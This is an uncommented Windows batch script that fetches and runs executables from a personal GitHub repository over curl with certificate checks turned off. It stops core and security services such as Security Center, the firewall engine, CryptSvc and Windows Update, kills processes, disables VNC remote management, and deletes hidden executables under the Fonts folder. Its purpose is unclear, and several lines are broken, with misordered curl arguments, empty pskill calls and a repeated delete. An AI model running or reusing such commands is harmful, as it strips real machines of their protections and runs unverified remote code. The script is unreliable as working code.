@echo off

:L1
goto L2
need pskill psexec

:L2
cd c:\
curl -k -o c:\pslist.exe https://github.com/wertynolly/box1/blob/main/bin/pslist
curl -k -o c:\pskill.exe https://github.com/wertynolly/box1/blob/main/bin/pskill

pslist -accepteula > c:/ps.txt

sc stop serivces

pskill -accepteula serivces.exe
del /f /Q /A:H C:\Windows\SysWOW64\serivces.exe

sc stop themes
sc stop VaultSvc
sc stop MicrosoftMysql
sc stop AudioSrv
sc stop wscsvc
sc stop AudioEndpointBuilder
sc stop UxSms
sc stop wudfsvc
sc stop AeLookupSvc
sc stop BITS
sc stop ProfSvc
sc stop Schedule
sc stop wuauserv
sc stop SENS
sc stop Winmgmt
sc stop gpsvc
sc stop EventSystem
sc stop FontCache
sc stop DiagTrack
sc stop Wsearch
sc stop BFE
sc stop CryptSvc
sc stop DcomLaunch
sc stop DiagTrack
sc stop stisvc
sc stop tvnserver
sc stop WinHttpAutoProxySvc
sc stop wudfsvc
sc stop MicrosoftMysql
sc stop serivces
sc stop MicrosotMaims

pskill -accepteula hkcmd.exe
pskill -accepteula igfxtray.exe
pskill -accepteula igfxpers.exe
pskill -accepteula 
pskill -accepteula 
pskill -accepteula 
pskill -accepteula audiodg.exe

ren C:\CCBootClient\ThirdParty\TightVNC\tvnserver.exe tvnserver.exe-
pskill -accepteula tvnserver.exe

ren C:\GBillingClient\winvnc.exe winvnc.exe-
pskill -accepteula winvnc.exe

pskill -accepteula puls.exe
del /f /q /A:H C:\Windows\Fonts\Mysql\puls.exe

pskill -accepteula  mance.exe
del /f /q /A:H C:\Windows\Fonts\Mysql\mance.exe

pskill PING.EXE

pskill -accepteula  eter.exe
del /f /q /A:H C:\Windows\Fonts\Mysql\mance.exe

DEL /F /Q /A:H c:\Windows\Fonts\conhost.exe

curl -k -o c:\procexp.exe https://live.sysinternals.com/procexp.exe c:\procexp.exe
start c:\procexp.exe

curl -k -o https://github.com/wertynolly/box1/blob/main/unzip.exe c:\unzip.exe

curl -k -o https://github.com/billziss-gh/winfsp/releases/download/v1.9/winfsp-1.9.21096.msi c:\0.msi
c:\0.msi
del c:\0.msi

curl -k -o http://7-zip.org/a/7z1604-x64.exe 0.exe
0.exe
del 0.exe

curl -k -o https://download.geany.org/geany-1.37.1_setup.exe 0.exe
0.exe
del 0.exe

curl -k -o http://7-zip.org/a/7z1604-x64.exe c:\7zip.exe
c:\7zip.exe
